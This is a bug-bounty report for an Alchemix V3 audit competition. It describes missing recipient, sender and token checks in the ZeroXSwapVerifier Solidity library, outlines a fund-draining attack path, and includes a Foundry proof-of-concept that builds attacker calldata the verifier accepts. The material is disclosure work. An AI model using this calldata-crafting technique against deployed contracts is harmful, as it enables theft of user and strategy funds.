# 57697 sc low missing recipient from checks in zeroxswapverifier enable direct asset theft

**Submitted on Oct 28th 2025 at 09:02:22 UTC by @yesofcourse for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57697
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`ZeroXSwapVerifier` - the library intended to pre-verify 0x swap calldata—omits critical checks on the **recipient** and the **`from`** address and uses spoofable parsing for VIP routes.

As a result, attacker-crafted calldata can pass verification while (a) **pulling tokens from the owner/strategy** and (b) **sending swap proceeds to the attacker**.

If integrated in production (as intended for future strategies), this becomes a straight path to **direct theft of user/strategy funds**.

## Vulnerability Details

The verifier is meant to block unsafe 0x calldata before execution. However:

* **Recipient and `buyToken` not enforced** in the top-level verifier:

  ```solidity
  // _verifyExecuteCalldata(...)
  (SlippageAndActions memory saa, ) = abi.decode(data, (SlippageAndActions, bytes));
  _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
  ```

  There is **no assertion** that `saa.recipient == owner` (or whitelisted) and no binding that `saa.buyToken` equals the expected asset.
* **`TRANSFER_FROM` ignores the true seller (`from`)**:

  ```solidity
  // _verifyTransferFrom(...)
  (address token, /*from*/, /*to*/, uint256 amount) =
      abi.decode(_slice(action, 4), (address, address, address, uint256));
  require(token == targetToken, "IT");  // ← `from` is decoded but never validated
  ```

  Any calldata that pulls funds from **any address** passes, provided the token matches `targetToken`. This defeats the point of verifying ownership of funds being spent.
* **VIP route token parsing is spoofable**:

  ```solidity
  // _extractTokenFromUniswapFills(...)
  if (fills.length >= 32) {
      return abi.decode(_slice(fills, 0, 32), (address)); // <- trivially forged first word
  }
  ```

  For Uniswap V3 (and similar “VIP” paths), the verifier accepts the first 32 bytes of `fills` as the token-easy to forge so the verifier “sees” the expected token while the real route pays out elsewhere.

A typical integration would do:

1. `require(ZeroXSwapVerifier.verifySwapCalldata(...));`
2. Call the 0x executor/settler with the same calldata (and the strategy has allowances set).

An attacker builds calldata that:

* Sets `recipient = attacker` (unchecked).
* Includes a `TRANSFER_FROM` that **pulls** the strategy’s tokens (unchecked `from`).
* Uses VIP `fills` that decode to the expected token in the verifier but route value to the attacker in execution.

**The PoC in the next section tests and proves:**

* `test_Verifier_Ignores_From_In_TransferFrom` – Verifier **passes** a payload that pulls from a non-owner.
* `test_Verifier_Allows_Attacker_Recipient_On_VIP` – Verifier **passes** a VIP payload with `recipient = attacker` and spoofed `buyToken`.

This demonstrates the **verification bypass** decisively.

Even though there are currently no strategies utilizing `ZeroXSwapVerifier`, the team explicitly stated that it is in scope:

> The intent is the ZeroXSwapVerifier is in scope as it is intended to be used in future strategies. We will validate reports that do not involve an impossible/OOS scenario and find logical errors in the contract. A PoC should be submitted using the contract entry points, demonstrating errors in the contracts flows.

* This report demonstrates **logical errors in the library** via its public entry points (verification functions), with a PoC that shows **malicious calldata is accepted**.
* Given the stated intent to integrate this verifier in future strategies, the flaw translates directly into **critical, one-call drains** once adopted, and should be treated as **Critical severity** now to avoid future incidents.

## Impact Details

* **Direct asset loss.** Given standard allowances, an attacker can get “verified” calldata executed that:
  * **Pulls** `tokenIn` from the owner/strategy (unchecked `from`).
  * **Pays** `tokenOut` to the attacker (unchecked `recipient`/`buyToken`).
* Any vault/strategy/module that trusts this verifier before forwarding calldata to a 0x executor is exposed. Loss scales with approved balances/limits.

## References

* Affected library: `src/utils/ZeroXSwapVerifier.sol`
  * `_verifyExecuteCalldata` – no recipient / `buyToken` enforcement. <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol#L125-L130>
  * `_verifyTransferFrom` – ignores `from` address. <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol#L238-L246>
  * VIP helpers (e.g., `_extractTokenFromUniswapFills`) – spoofable decoding. <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol#L281-L287>

## Proof of Concept

## Proof of Concept

Paste the following file in `src/test/ZeroXSwapVerifier_PoC.t.sol` and run with `forge test --match-contract ZeroXSwapVerifier_PoC -vv`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

contract ZeroXSwapVerifier_PoC is Test {
    TestERC20 internal token;

    address constant OWNER    = address(0x1111);
    address constant ATTACKER = address(0xA11CE);

    // Top-level selectors used by the verifier
    bytes4 private constant EXECUTE_SELECTOR          = 0xcf71ff4f; // execute(SlippageAndActions,bytes[])
    // Action selectors covered by the verifier
    bytes4 private constant TRANSFER_FROM             = 0x8d68a156;
    bytes4 private constant UNISWAPV3_VIP             = 0x9ebf8e8d;

    function setUp() public {
        token = new TestERC20(1_000e18, 18);
        deal(address(token), OWNER,    100e18);
        deal(address(token), ATTACKER, 0);
    }

    /// PoC #1: TRANSFER_FROM passes even when `from != owner` (verifier ignores `from`)
    function test_Verifier_Ignores_From_In_TransferFrom() public {
        bytes memory _calldata = _buildCalldata_WithTransferFrom(
            /*sellToken=*/address(token),
            /*from=*/address(0xBEEF),  // NOT OWNER
            /*to=*/ATTACKER,
            /*amount=*/50e18
        );

        bool ok = ZeroXSwapVerifier.verifySwapCalldata(
            _calldata,
            OWNER,
            address(token),
            /*maxSlippageBps=*/1000
        );
        assertTrue(ok, "verifier incorrectly rejects; should *pass* (bug: from not enforced)");
    }

    /// PoC #2: Recipient/buyToken unchecked — VIP route passes with attacker as recipient
    function test_Verifier_Allows_Attacker_Recipient_On_VIP() public {
        bytes memory _calldata = _buildCalldata_UniswapV3VIP_AttackerRecipient(
            /*buyTokenSeenByParser=*/address(token),
            /*bps=*/300,
            /*recipient=*/ATTACKER
        );

        bool ok = ZeroXSwapVerifier.verifySwapCalldata(
            _calldata,
            OWNER,
            address(token),
            /*maxSlippageBps=*/1000
        );
        assertTrue(ok, "verifier incorrectly rejects; should *pass* (bug: recipient/buyToken not enforced)");
    }

    // ----------------- helpers -----------------

    function _buildCalldata_WithTransferFrom(
        address sellToken,
        address from,
        address to,
        uint256 amount
    ) internal pure returns (bytes memory) {
        // action: TRANSFER_FROM(token, from, to, amount)
        bytes memory action = abi.encodeWithSelector(TRANSFER_FROM, sellToken, from, to, amount);

        // In _buildCalldata_WithTransferFrom(...)
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: to,
            buyToken: address(0),
            minAmountOut: 0,
            actions: new bytes[](1)           
        });
        saa.actions[0] = action;

        // IMPORTANT: third arg is bytes[] (empty)
        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));  

    }

    function _buildCalldata_UniswapV3VIP_AttackerRecipient(
        address buyTokenSeenByParser,
        uint256 bps,
        address recipient
    ) internal pure returns (bytes memory) {
        // VIP 'fills': verifier heuristically decodes the first 32 bytes as token
        bytes memory fills = abi.encode(buyTokenSeenByParser, uint256(100e18));

        // action: UNISWAPV3_VIP(recipient, bps, feeOrTickSpacing, feeOnTransfer, fills)
        bytes memory action = abi.encodeWithSelector(
            UNISWAPV3_VIP,
            recipient,
            bps,
            uint24(3000),
            false,
            fills
        );
        // In _buildCalldata_UniswapV3VIP_AttackerRecipient(...)
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: recipient,
            buyToken: address(0),
            minAmountOut: 0,
            actions: new bytes[](1)          
        });
        saa.actions[0] = action;

        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));  

    }
}

```

Result:

```
[PASS] test_Verifier_Allows_Attacker_Recipient_On_VIP() (gas: 117270)
[PASS] test_Verifier_Ignores_From_In_TransferFrom() (gas: 62072)
```
